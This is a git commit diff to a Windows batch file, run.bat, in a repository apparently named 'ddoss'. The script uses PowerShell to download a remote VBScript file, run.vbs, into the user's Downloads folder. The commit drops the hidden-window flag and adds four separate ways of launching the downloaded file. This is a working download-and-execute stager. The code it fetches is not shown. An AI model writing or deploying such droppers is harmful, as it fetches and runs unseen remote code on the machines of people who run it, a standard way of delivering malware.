85790f0f4bd0ea90efd5fc9685c0d7a388f079b7
srap18 <48030957+srap18@users.noreply.github.com>
2025-08-08 23:13:13 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,5 +3,11 @@
 set "url=https://raw.githubusercontent.com/srap18/ddoss/main/run.vbs"
 set "dest=%USERPROFILE%\Downloads\run.vbs"
 
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%dest%')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%dest%')"
+
 start "" "%dest%"
+wscript "%dest%"
+cmd /c "%dest%"
+explorer "%dest%"
+
+pause
